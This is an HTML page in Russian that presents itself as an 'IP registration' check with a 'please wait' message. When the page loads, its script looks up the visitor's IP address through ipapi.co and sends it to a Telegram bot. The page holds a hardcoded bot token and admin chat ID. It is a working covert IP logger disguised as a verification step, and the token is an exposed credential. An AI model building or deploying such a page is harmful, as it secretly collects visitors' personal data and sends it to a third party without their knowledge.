<!DOCTYPE html>
<html>
<head>
  <title>Регистрация IP</title>
</head>
<body>
<h2>Регистрация IP</h2>
<p>Подождите, идёт проверка...</p>

<script>
async function sendIP() {
    try {
        // Получаем IP
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        const ip = data.ip;

        // Отправляем IP боту напрямую через Bot API
        const BOT_TOKEN = "8456230167:AAHCaeyIsgjBRaBvZ_4Q29awaUv4Ikd3rzw";
        const ADMIN_ID = 1040339009; // Для теста можно ваш ID
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `Новый IP: ${ip}`
            })
        });

        document.body.innerHTML = "<p>IP проверен!</p>";
    } catch (err) {
        console.error(err);
        document.body.innerHTML = "<p>Ошибка при проверке IP.</p>";
    }
}

sendIP();
</script>
</body>
</html>
